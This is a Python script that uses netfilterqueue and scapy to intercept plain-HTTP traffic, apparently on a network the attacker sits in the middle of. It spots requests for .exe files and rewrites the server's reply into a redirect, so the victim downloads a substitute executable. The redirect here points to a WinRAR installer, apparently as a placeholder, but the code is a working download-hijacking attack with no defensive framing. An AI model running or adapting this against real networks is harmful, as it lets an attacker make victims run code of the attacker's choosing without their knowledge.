#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy

# A list to keep track of ACK numbers for intercepted .exe requests
ack_list = []

# Function to modify the packet load (payload)
def set_load(packet, load):
    packet[scapy.Raw].load = load
    # Recalculate necessary fields to avoid packet corruption
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

# Main packet processing function
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        # Intercept HTTP request (destination port 80)
        if scapy_packet[scapy.TCP].dport == 80:
            if b".exe" in scapy_packet[scapy.Raw].load:
                print("[+] .exe Request intercepted")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        # Intercept HTTP response (source port 80)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing .exe with custom file")

                # Replace response with a redirect to custom .exe file
                modified_packet = set_load(
                    scapy_packet,
                    b"HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
                )
                packet.set_payload(bytes(modified_packet))

    # Accept the (possibly modified) packet
    packet.accept()

# Bind the queue and start processing packets
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()